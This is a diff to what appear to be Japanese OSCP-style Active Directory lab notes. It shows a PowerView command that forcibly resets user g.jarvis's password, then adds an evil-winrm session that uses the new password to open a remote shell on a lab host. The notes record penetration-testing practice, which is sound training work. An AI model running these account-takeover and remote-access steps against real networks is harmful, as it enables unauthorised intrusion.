@@ -316,6 +316,22 @@ $NewPassword = ConvertTo-SecureString "Password123" -AsPlainText -Force
 Set-DomainUserPassword -Identity "CN=g.jarvis,CN=Users,DC=oscp,DC=exam" -AccountPassword $NewPassword
 ```
 
+- パスワード変更に成功
+```powershell
+┌──(koshi㉿kali)-[~/Exam/AD/WS26]
+└─$ evil-winrm -i 192.168.104.206  -u 'g.jarvis' -p 'Password123'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\g.jarvis\Documents> 
+
+```
+![[Pasted image 20260222164424.png]]
 
 
 ---
